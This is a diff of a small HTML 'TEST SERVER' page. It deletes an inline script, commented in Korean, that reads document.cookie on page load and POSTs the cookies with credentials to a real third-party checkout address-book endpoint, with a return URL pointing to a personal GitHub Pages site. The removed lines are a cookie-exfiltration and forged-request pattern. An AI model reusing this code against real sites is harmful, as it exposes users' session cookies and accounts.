@@ -3,43 +3,7 @@
 <head>
   <meta charset="utf-8">
   <title>TEST SERVER</title>
-  <script>
-    // 페이지가 로드될 때 쿠키를 표시하고 서버에 요청을 보냄
-    window.onload = function() {
-      // 쿠키 표시
-      document.body.innerHTML += '<h1>쿠키: ' + document.cookie + '</h1>';
-
-      // 서버에 요청 보내기
-      sendRequest();
-    };
-
-    function sendRequest() {
-      // 요청할 서버 URL
-      const url = 'https://id.tw.coupang.com/addressbook/picker?checkoutId=1739950459013&pickSeq=2318534&dawnOnly=false&displayBackButton=false&displayDeliveryPreferences=false&callback=window.webkit.messageHandlers.checkoutCallBack.postMessage&deliveryType&time=1739950459725&returnUrl=https://gituseryun.github.io/index.html';
-
-      // 요청할 데이터
-      const data = {
-        key: 'value', // 요청 본문에 포함할 데이터
-        cookie: document.cookie // 쿠키를 요청 본문에 포함
-      };
-
-      fetch(url, {
-        method: 'POST',
-        credentials: 'include', // 쿠키 포함
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(data)
-      })
-      .then(response => response.json()) // JSON 응답으로 처리
-      .then(data => {
-        console.log('서버 응답:', data);
-      })
-      .catch(error => {
-        console.error('오류 발생:', error);
-      });
-    }
-  </script>
+  <script></script>
 </head>
 <body>
 </body>
